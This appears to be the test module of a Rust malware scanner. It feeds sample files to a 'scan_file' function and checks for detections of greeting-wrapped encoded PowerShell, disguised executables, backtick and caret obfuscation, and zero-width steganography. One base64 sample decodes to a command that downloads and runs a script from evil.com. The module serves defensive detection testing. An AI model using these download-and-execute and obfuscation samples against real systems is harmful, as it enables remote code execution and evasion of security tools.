        let mut random_like = Vec::with_capacity(256 * 10);
        for i in 0..256 {
            for _ in 0..10 {
                random_like.push(i as u8);
            }
        }
        let e = calculate_entropy(&random_like);
        assert!(e > 7.9);
    }

    #[test]
    fn test_deceptive_greeting_wrapper_detection_cyrillic() {
        // "Привет" with a capital П only matches when the haystack is
        // Unicode-lowercased (to_ascii_lowercase leaves Cyrillic untouched).
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("test_deceptive_cyrillic.txt");
        {
            let mut f = File::create(&file_path).unwrap();
            f.write_all(
                "Привет, друг! Запусти powershell -enc aG52b2tlLWV4cHJlc3Npb24gKA==\n".as_bytes(),
            )
            .unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(report
            .findings
            .iter()
            .any(|f| f.category == "Deceptive Greeting Wrapper"));
    }

    #[test]
    fn test_deceptive_greeting_wrapper_detection() {
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("test_deceptive_malware.txt");
        {
            let mut f = File::create(&file_path).unwrap();
            f.write_all("Xin chao ban yeu dau! Chuc mot ngay tot lanh.\n\npowershell -enc aW52b2tlLWV4cHJlc3Npb24gKG5ldy1vYmplY3Qgc3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCJodHRwczovL2V2aWwuY29tL3BheWxvYWQucHMxIik=".as_bytes()).unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(report.risk_score >= 60);
        assert_eq!(report.risk_level, "MALICIOUS");
        assert!(report.summary_text.starts_with("👋 Hello! "));
        assert!(report
            .findings
            .iter()
            .any(|f| f.category == "Deceptive Greeting Wrapper"));
    }

    #[test]
    fn test_disguised_pe_detection() {
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("fake_invoice.pdf");
        {
            let mut f = File::create(&file_path).unwrap();
            f.write_all(b"MZ\x90\x00\x03\x00\x00\x00This program cannot be run in DOS mode.")
                .unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(report.is_pe);
        assert!(report
            .findings
            .iter()
            .any(|f| f.category == "Disguised Executable"));
    }

    #[test]
    fn test_tmf_analysis_injected_powershell() {
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("driver_trace.tmf");
        {
            let mut f = File::create(&file_path).unwrap();
            f.write_all("// PDB: mydriver.pdb\n#typev Driver_c100 10 \"[Trace] %!FUNC!\" // Injected: powershell downloadstring\n".as_bytes()).unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(report
            .findings
            .iter()
            .any(|f| f.category == "Injected Code in TMF Trace Format"));
        assert!(report.risk_score >= 45);
    }

    #[test]
    fn test_tmf_disguised_executable() {
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("fake_trace.tmf");
        {
            let mut f = File::create(&file_path).unwrap();
            f.write_all(b"MZ\x90\x00\x03\x00\x00\x00Fake TMF is actually PE")
                .unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(report.is_pe);
        assert!(report
            .findings
            .iter()
            .any(|f| f.category == "Disguised Executable"));
    }

    #[test]
    fn test_backtick_obfuscation_detection() {
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("test_backtick.ps1");
        {
            let mut f = File::create(&file_path).unwrap();
            f.write_all("Write-Host 'Test'\n& (p`o`w`e`r`s`h`e`l`l) -w hidden\n".as_bytes())
                .unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(report
            .findings
            .iter()
            .any(|f| f.category == "Backtick Obfuscation Evasion"));
    }

    #[test]
    fn test_zero_width_steganography_payload() {
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("test_stego.txt");
        {
            let mut f = File::create(&file_path).unwrap();

            let mut content = String::from("Normal innocent document text.\n");
            for b in b"http" {
                for i in (0..8).rev() {
                    if (b >> i) & 1 == 1 {
                        content.push('\u{200C}');
                    } else {
                        content.push('\u{200B}');
                    }
                }
            }
            f.write_all(content.as_bytes()).unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(report
            .findings
            .iter()
            .any(|f| f.category == "Decoded Zero-Width Steganography Payload"));
    }

    #[test]
    fn test_safe_char_boundary_slice_multibyte() {
        let text = "Xin chào 👋 世界 Привет powershell downloadstring kết thúc kiểm tra.";
        let idx = text.find("powershell").unwrap();
        let snippet = safe_char_boundary_slice(text, idx, "powershell".len());
        assert!(snippet.contains("powershell"));
    }

    // ---- Backtick / caret separator-scoping tests (has_split_token) ----

    #[test]
    fn test_has_split_token_matches_obfuscated_token() {
        // Backticks INSIDE the keyword itself must be detected.
        assert!(has_split_token("p`o`w`e`r`s`h`e`l`l", "powershell", '`'));
        assert!(has_split_token("p^o^w^e^r^s^h^e^l^l", "powershell", '^'));
        // A separator inside an adjacent word does not mask detection.
        assert!(has_split_token("run `some` tool then i`ex", "iex", '`'));
        assert!(has_split_token("cm^d^.^e^x^e", "cmd.exe", '^'));
    }

    #[test]
    fn test_has_split_token_ignores_markdown_quotes_and_fences() {
        // Backticks only AROUND whole tokens (quoting, Markdown code spans or
        // fences) are not obfuscation.
        assert!(!has_split_token("`powershell`", "powershell", '`'));
        assert!(!has_split_token("```powershell", "powershell", '`'));
        assert!(!has_split_token("run `cmd.exe` now", "cmd.exe", '`'));
    }

    #[test]
    fn test_has_split_token_ignores_plain_token_and_other_word_separators() {
        // A plain keyword elsewhere (no interior separator) is not claimed.
        assert!(!has_split_token("powershell", "powershell", '`'));
        assert!(!has_split_token("use `x` or `y` here", "iex", '`'));
        // Only ONE contiguous token is considered: the separator-split chars
        // must reconstruct the keyword within that single token.
        assert!(!has_split_token("po`we", "powershell", '`'));
        assert!(!has_split_token("rshell `x`", "powershell", '`'));
    }

    #[test]
    fn test_benign_markdown_backticks_no_finding() {
        // Regression: documentation quoting shell names with backticks must
        // NOT raise "Backtick Obfuscation Evasion".
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("test_benign_backticks_doc.txt");
        {
            let mut f = File::create(&file_path).unwrap();
            f.write_all(
                b"# Notes\n\
                  Run `cmd.exe` to inspect the log, or `certutil` for hashes.\n\
                  ```powershell\n\
                  Get-ChildItem C:\\Logs\n\
                  ```\n\
                  Prefer `bitsadmin` docs over rundll32 references.\n",
            )
            .unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(!report
            .findings
            .iter()
            .any(|f| f.category == "Backtick Obfuscation Evasion"));
        assert!(!report
            .findings
            .iter()
            .any(|f| f.category == "Caret Escape Obfuscation"));
    }

    #[test]
    fn test_benign_caret_reference_no_finding() {
        // Regression: prose that merely mentions "cmd.exe" next to a caret
        // escape elsewhere must NOT raise "Caret Escape Obfuscation".
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("test_benign_caret_doc.txt");
        {
            let mut f = File::create(&file_path).unwrap();
            f.write_all(
                b"Batch escape notes:\n\
                  Use ^ at end of line to continue a line in cmd.exe scripts.\n\
                  See certutil documentation for hash verification.\n",
            )
            .unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(!report
            .findings
            .iter()
            .any(|f| f.category == "Caret Escape Obfuscation"));
    }

    #[test]
    fn test_backtick_split_inside_token_still_detected() {
        // Detection preserved when the separator genuinely splits the keyword.
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join("test_backtick_split_real.ps1");
        {
            let mut f = File::create(&file_path).unwrap();
            f.write_all(b"I`n`v`o`k`e`-`E`x`p`r`e`s`s`i`o`n probe line\n")
                .unwrap();
        }

        let report = scan_file(&file_path).unwrap();
        let _ = std::fs::remove_file(&file_path);

        assert!(report
            .findings
            .iter()
            .any(|f| f.category == "Backtick Obfuscation Evasion"));
    }

    #[test]
    fn test_split_token_requires_boundaries() {
        for separator in ['`', '^'] {
            for text in [
                format!("prefixpo{separator}wershell"),
                format!("po{separator}wershell_suffix"),
                format!("épo{separator}wershell"),
                format!("po{separator}wershell-example"),
                format!("po{separator}wer shell"),
            ] {
                assert!(!has_split_token(&text, "powershell", separator), "{text}");
            }
        }
    }

    #[test]
    fn test_split_token_detection_with_plain_token_elsewhere() {
        // Inert token lists only: no invocation, arguments, or payload.
        for (separator, category) in [
            ('`', "Backtick Obfuscation Evasion"),
            ('^', "Caret Escape Obfuscation"),
        ] {
            for text in [
                format!("powershell; po{separator}wershell"),
                format!("po{separator}wershell; powershell"),
            ] {
                let mut findings = Vec::new();
                let mut score = 0;
                scan_hidden_deceptive_code(&text, &mut findings, &mut score);
                assert_eq!(score, 40, "{text}");
                assert_eq!(findings.len(), 1, "{text}");
                assert_eq!(findings[0].category, category);
            }
        }
    }
}
